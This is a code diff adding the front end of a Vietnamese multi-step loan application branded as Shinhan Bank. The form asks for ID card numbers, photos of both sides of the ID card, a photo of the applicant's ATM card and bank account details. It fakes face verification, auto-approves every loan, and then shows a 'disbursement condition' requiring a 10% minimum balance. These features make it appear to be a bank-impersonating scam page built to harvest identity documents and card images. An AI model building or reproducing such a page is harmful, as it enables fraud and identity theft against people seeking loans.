+                            React.createElement('div', { className: 'input-container' },
+                                React.createElement('input', { name: 'permanentAddress', placeholder: 'Địa chỉ thường trú (*)', value: formData.permanentAddress, onChange: handleInputChange, className: errors.permanentAddress ? 'error' : '' }),
+                                errors.permanentAddress && React.createElement('div', { className: 'error-message' }, errors.permanentAddress)
+                            ),
+                            React.createElement('div', { className: 'input-container' },
+                                React.createElement('input', { name: 'temporaryAddress', placeholder: 'Địa chỉ tạm trú (*)', value: formData.temporaryAddress, onChange: handleInputChange, className: errors.temporaryAddress ? 'error' : '' }),
+                                errors.temporaryAddress && React.createElement('div', { className: 'error-message' }, errors.temporaryAddress)
+                            ),
+                            React.createElement('div', { className: 'flex justify-between mt-4' },
+                                React.createElement('button', { type: 'button', className: 'btn-primary bg-gray-400', onClick: () => prevStep(1) }, 'Quay lại'),
+                                React.createElement('button', { type: 'button', className: 'btn-primary', onClick: () => nextStep(3) }, 'Tiếp theo')
+                            )
+                        ),
+                        // Step 3: Financial Info
+                        step === 3 && React.createElement('div', null,
+                            React.createElement('p', { className: 'mb-4' }, React.createElement('strong', null, 'Hướng dẫn:'), ' Cung cấp thông tin tài chính.'),
+                            React.createElement('div', { className: 'input-container' },
+                                React.createElement('input', { type: 'number', name: 'monthlyIncome', placeholder: 'Thu nhập hàng tháng (VNĐ) (*)', value: formData.monthlyIncome, onChange: handleInputChange, className: errors.monthlyIncome ? 'error' : '' }),
+                                errors.monthlyIncome && React.createElement('div', { className: 'error-message' }, errors.monthlyIncome)
+                            ),
+                            React.createElement('div', { className: 'input-container' },
+                                React.createElement('input', { name: 'occupation', placeholder: 'Nghề nghiệp (*)', value: formData.occupation, onChange: handleInputChange, className: errors.occupation ? 'error' : '' }),
+                                errors.occupation && React.createElement('div', { className: 'error-message' }, errors.occupation)
+                            ),
+                            React.createElement('div', { className: 'input-container' },
+                                React.createElement('input', { name: 'referralCode', placeholder: 'Mã giới thiệu (nếu có)', value: formData.referralCode, onChange: handleInputChange })
+                            ),
+                            React.createElement('div', { className: 'flex justify-between mt-4' },
+                                React.createElement('button', { type: 'button', className: 'btn-primary bg-gray-400', onClick: () => prevStep(2) }, 'Quay lại'),
+                                React.createElement('button', { type: 'button', className: 'btn-primary', onClick: () => nextStep(4) }, 'Tiếp theo')
+                            )
+                        ),
+                        // Step 4: ID Details
+                        step === 4 && React.createElement('div', null,
+                            React.createElement('p', { className: 'mb-4' }, React.createElement('strong', null, 'Hướng dẫn:'), ' Cung cấp thông tin giấy tờ tùy thân.'),
+                            React.createElement('div', { className: 'input-container' },
+                                React.createElement('input', { name: 'idNumber', placeholder: 'Số CCCD/CMND (*)', value: formData.idNumber, onChange: handleInputChange, className: errors.idNumber ? 'error' : '' }),
+                                errors.idNumber && React.createElement('div', { className: 'error-message' }, errors.idNumber)
+                            ),
+                            React.createElement('div', { className: 'input-container' },
+                                React.createElement('input', { type: 'date', name: 'idIssueDate', value: formData.idIssueDate, onChange: handleInputChange, className: errors.idIssueDate ? 'error' : '' }),
+                                errors.idIssueDate && React.createElement('div', { className: 'error-message' }, errors.idIssueDate)
+                            ),
+                            React.createElement('div', { className: 'input-container' },
+                                React.createElement('input', { name: 'idIssuePlace', placeholder: 'Nơi cấp (*)', value: formData.idIssuePlace, onChange: handleInputChange, className: errors.idIssuePlace ? 'error' : '' }),
+                                errors.idIssuePlace && React.createElement('div', { className: 'error-message' }, errors.idIssuePlace)
+                            ),
+                            React.createElement('div', { className: 'flex justify-between mt-4' },
+                                React.createElement('button', { type: 'button', className: 'btn-primary bg-gray-400', onClick: () => prevStep(3) }, 'Quay lại'),
+                                React.createElement('button', { type: 'button', className: 'btn-primary', onClick: () => nextStep(5) }, 'Tiếp theo')
+                            )
+                        ),
+                        // Step 5: ID Photo (Front)
+                        step === 5 && React.createElement('div', null,
+                            React.createElement('p', { className: 'mb-4' }, React.createElement('strong', null, 'Hướng dẫn:'), ' Tải ảnh mặt trước CCCD/CMND.'),
+                            React.createElement('div', { className: 'input-container' },
+                                React.createElement('label', null, 'Ảnh CCCD/CMND (Mặt trước) (*)'),
+                                React.createElement('input', { type: 'file', name: 'idPhotoFront', accept: 'image/jpeg,image/png', onChange: handleFileUpload, className: errors.idPhotoFront ? 'error' : '' }),
+                                formData.idPhotoFront && React.createElement('img', { src: URL.createObjectURL(formData.idPhotoFront), className: 'photo-preview', alt: 'Mặt trước CCCD' }),
+                                errors.idPhotoFront && React.createElement('div', { className: 'error-message' }, errors.idPhotoFront)
+                            ),
+                            React.createElement('div', { className: 'flex justify-between mt-4' },
+                                React.createElement('button', { type: 'button', className: 'btn-primary bg-gray-400', onClick: () => prevStep(4) }, 'Quay lại'),
+                                React.createElement('button', { type: 'button', className: 'btn-primary', onClick: () => nextStep(6) }, 'Tiếp theo')
+                            )
+                        ),
+                        // Step 6: ID Photo (Back)
+                        step === 6 && React.createElement('div', null,
+                            React.createElement('p', { className: 'mb-4' }, React.createElement('strong', null, 'Hướng dẫn:'), ' Tải ảnh mặt sau CCCD/CMND.'),
+                            React.createElement('div', { className: 'input-container' },
+                                React.createElement('label', null, 'Ảnh CCCD/CMND (Mặt sau) (*)'),
+                                React.createElement('input', { type: 'file', name: 'idPhotoBack', accept: 'image/jpeg,image/png', onChange: handleFileUpload, className: errors.idPhotoBack ? 'error' : '' }),
+                                formData.idPhotoBack && React.createElement('img', { src: URL.createObjectURL(formData.idPhotoBack), className: 'photo-preview', alt: 'Mặt sau CCCD' }),
+                                errors.idPhotoBack && React.createElement('div', { className: 'error-message' }, errors.idPhotoBack)
+                            ),
+                            React.createElement('div', { className: 'flex justify-between mt-4' },
+                                React.createElement('button', { type: 'button', className: 'btn-primary bg-gray-400', onClick: () => prevStep(5) }, 'Quay lại'),
+                                React.createElement('button', { type: 'button', className: 'btn-primary', onClick: () => nextStep(7) }, 'Tiếp theo')
+                            )
+                        ),
+                        // Step 7: ATM Photo
+                        step === 7 && React.createElement('div', null,
+                            React.createElement('p', { className: 'mb-4' }, React.createElement('strong', null, 'Hướng dẫn:'), ' Tải ảnh thẻ ATM.'),
+                            React.createElement('div', { className: 'input-container' },
+                                React.createElement('label', null, 'Ảnh thẻ ATM (*)'),
+                                React.createElement('input', { type: 'file', name: 'atmPhoto', accept: 'image/jpeg,image/png', onChange: handleFileUpload, className: errors.atmPhoto ? 'error' : '' }),
+                                formData.atmPhoto && React.createElement('img', { src: URL.createObjectURL(formData.atmPhoto), className: 'photo-preview', alt: 'Thẻ ATM' }),
+                                errors.atmPhoto && React.createElement('div', { className: 'error-message' }, errors.atmPhoto)
+                            ),
+                            React.createElement('div', { className: 'flex justify-between mt-4' },
+                                React.createElement('button', { type: 'button', className: 'btn-primary bg-gray-400', onClick: () => prevStep(6) }, 'Quay lại'),
+                                React.createElement('button', { type: 'button', className: 'btn-primary', onClick: () => nextStep(8) }, 'Tiếp theo')
+                            )
+                        ),
+                        // Step 8: Face Verification (Mock)
+                        step === 8 && React.createElement('div', null,
+                            React.createElement('p', { className: 'mb-4' }, React.createElement('strong', null, 'Hướng dẫn:'), ' Nhấn nút để xác minh danh tính.'),
+                            React.createElement('button', { className: 'btn-primary', onClick: () => nextStep(9) }, 'Xác minh khuôn mặt (Mock)'),
+                            React.createElement('div', { className: 'flex justify-between mt-4' },
+                                React.createElement('button', { type: 'button', className: 'btn-primary bg-gray-400', onClick: () => prevStep(7) }, 'Quay lại')
+                            )
+                        ),
+                        // Step 9: Loan & Bank Info
+                        step === 9 && React.createElement('div', null,
+                            React.createElement('p', { className: 'mb-4' }, React.createElement('strong', null, 'Hướng dẫn:'), ' Cung cấp thông tin khoản vay và ngân hàng.'),
+                            React.createElement('div', { className: 'input-container' },
+                                React.createElement('input', { type: 'number', name: 'loanAmount', placeholder: 'Số tiền vay (VNĐ) (*)', value: formData.loanAmount, onChange: handleInputChange, className: errors.loanAmount ? 'error' : '' }),
+                                errors.loanAmount && React.createElement('div', { className: 'error-message' }, errors.loanAmount)
+                            ),
+                            React.createElement('div', { className: 'input-container' },
+                                React.createElement('input', { type: 'number', name: 'loanTerm', placeholder: 'Thời hạn vay (tháng) (*)', value: formData.loanTerm, onChange: handleInputChange, className: errors.loanTerm ? 'error' : '' }),
+                                errors.loanTerm && React.createElement('div', { className: 'error-message' }, errors.loanTerm)
+                            ),
+                            React.createElement('div', { className: 'input-container' },
+                                React.createElement('select', { name: 'loanType', value: formData.loanType, onChange: handleInputChange, className: errors.loanType ? 'error' : '' },
+                                    React.createElement('option', { value: '' }, 'Chọn loại vay (*)'),
+                                    loanPackages.map(pkg => React.createElement('option', { key: pkg.value, value: pkg.value }, pkg.label))
+                                ),
+                                errors.loanType && React.createElement('div', { className: 'error-message' }, errors.loanType)
+                            ),
+                            React.createElement('div', { className: 'input-container' },
+                                React.createElement('input', { name: 'bankAccountNumber', placeholder: 'Số tài khoản ngân hàng (*)', value: formData.bankAccountNumber, onChange: handleInputChange, className: errors.bankAccountNumber ? 'error' : '' }),
+                                errors.bankAccountNumber && React.createElement('div', { className: 'error-message' }, errors.bankAccountNumber)
+                            ),
+                            React.createElement('div', { className: 'input-container' },
+                                React.createElement('input', { name: 'bankAccountName', placeholder: 'Họ và tên chủ tài khoản (*)', value: formData.bankAccountName, onChange: handleInputChange, className: errors.bankAccountName ? 'error' : '' }),
+                                errors.bankAccountName && React.createElement('div', { className: 'error-message' }, errors.bankAccountName)
+                            ),
+                            React.createElement('div', { className: 'input-container' },
+                                React.createElement('input', { name: 'bankName', placeholder: 'Tên ngân hàng (*)', value: formData.bankName, onChange: handleInputChange, className: errors.bankName ? 'error' : '' }),
+                                errors.bankName && React.createElement('div', { className: 'error-message' }, errors.bankName)
+                            ),
+                            monthlyPayment > 0 && React.createElement('div', { className: 'mt-4 p-4 bg-gray-100 rounded-lg' },
+                                React.createElement('p', null, React.createElement('strong', null, 'Số tiền trả hàng tháng:'), ' ', Math.round(monthlyPayment).toLocaleString(), ' VNĐ')
+                            ),
+                            React.createElement('div', { className: 'flex justify-between mt-4' },
+                                React.createElement('button', { type: 'button', className: 'btn-primary bg-gray-400', onClick: () => prevStep(8) }, 'Quay lại'),
+                                React.createElement('button', { type: 'button', className: 'btn-primary', onClick: submitForm }, 'Hoàn tất')
+                            )
+                        )
+                    )
+                ),
+                // Success Modal
+                showSuccess && !error && React.createElement('div', null,
+                    React.createElement('div', { className: 'modal-title' }, 'Chúc mừng!'),
+                    React.createElement('div', { className: 'text-center p-4 bg-[#f0f8ff] rounded-lg' },
+                        React.createElement('div', { className: 'text-5xl text-[#28a745] mb-4' }, '✔'),
+                        React.createElement('p', null, React.createElement('strong', null, `Chúc mừng ${formData.fullName || ''}!`)),
+                        React.createElement('p', null, `Đã duyệt khoản vay ${(parseInt(formData.loanAmount) || 0).toLocaleString()} VNĐ (${formData.loanType || ''}).`),
+                        React.createElement('button', { className: 'btn-primary', onClick: () => setState(prev => ({ ...prev, showSuccess: false, showContract: true })) }, 'Xem hồ sơ')
+                    )
+                ),
+                // Contract Modal
+                showContract && !error && React.createElement('div', null,
+                    React.createElement('div', { className: 'modal-title' }, 'Hồ sơ và hợp đồng vay'),
+                    React.createElement('div', { className: 'contract-container', id: 'contract-vay' },
+                        React.createElement('h4', { style: { textAlign: 'center' } }, 'HỢP ĐỒNG CHO VAY'),
+                        React.createElement('p', null, React.createElement('strong', null, 'Số hợp đồng:'), ' BANK-2025-', contractId),
+                        React.createElement('p', null, React.createElement('strong', null, 'Ngày:'), ' ', new Date().toISOString().split('T')[0]),
+                        React.createElement('table', { className: 'contract-table' },
+                            React.createElement('tr', null, React.createElement('th', null, 'Bên cho vay'), React.createElement('td', null, 'Shinhan Bank')),
+                            React.createElement('tr', null, React.createElement('th', null, 'Bên vay'), React.createElement('td', null, formData.fullName || '')),
+                            React.createElement('tr', null, React.createElement('th', null, 'Số CCCD/CMND'), React.createElement('td', null, formData.idNumber || '')),
+                            React.createElement('tr', null, React.createElement('th', null, 'Số tiền vay'), React.createElement('td', null, `${(parseInt(formData.loanAmount) || 0).toLocaleString()} VNĐ`)),
+                            React.createElement('tr', null, React.createElement('th', null, 'Thời hạn vay'), React.createElement('td', null, `${formData.loanTerm || '0'} tháng`)),
+                            React.createElement('tr', null, React.createElement('th', null, 'Lãi suất'), React.createElement('td', null, `${(selectedInterestRate * 100).toFixed(1)}%/năm`))
+                        ),
+                        React.createElement('a', { href: '/public/HopDongVay.pdf', className: 'download-link' }, 'Tải hợp đồng vay (PDF)')
+                    ),
+                    React.createElement('div', { className: 'disbursement-container', id: 'disbursement-confirmation' },
+                        React.createElement('h4', { style: { textAlign: 'center' } }, 'GIẤY XÁC NHẬN ĐIỀU KIỆN GIẢI NGÂN'),
+                        React.createElement('p', null, React.createElement('strong', null, 'Số hợp đồng:'), ' BANK-2025-', contractId),
+                        React.createElement('p', null, React.createElement('strong', null, 'Ngày:'), ' ', new Date().toISOString().split('T')[0]),
+                        React.createElement('table', { className: 'contract-table' },
+                            React.createElement('tr', null, React.createElement('th', null, 'Bên vay'), React.createElement('td', null, formData.fullName || '')),
+                            React.createElement('tr', null, React.createElement('th', null, 'Số tiền vay'), React.createElement('td', null, `${(parseInt(formData.loanAmount) || 0).toLocaleString()} VNĐ`)),
+                            React.createElement('tr', null, React.createElement('th', null, 'Thời hạn vay'), React.createElement('td', null, `${formData.loanTerm || '0'} tháng`)),
+                            React.createElement('tr', null, React.createElement('th', null, 'Lãi suất'), React.createElement('td', null, `${(selectedInterestRate * 100).toFixed(1)}%/năm`))
+                        ),
+                        React.createElement('h5', { className: 'mt-4 font-semibold' }, 'Điều kiện giải ngân'),
+                        React.createElement('ul', { className: 'list-disc ml-6' },
+                            React.createElement('li', null, 'Duy trì số dư tối thiểu 10% giá trị khoản vay trong tài khoản ngân hàng.')
+                        ),
+                        React.createElement('a', { href: '/public/GiayXacNhanGiaiNgan.pdf', className: 'download-link' }, 'Tải giấy xác nhận (PDF)')
+                    ),
+                    React.createElement('button', { className: 'btn-primary mt-4', onClick: () => closeModal('registerModal') }, 'Đóng')
+                )
+            );
+        }
+
+        ReactDOM.render(
+            React.createElement(RegisterApp),
+            document.getElementById('register-root')
+        );
+    </script>
+</body>
+</html>
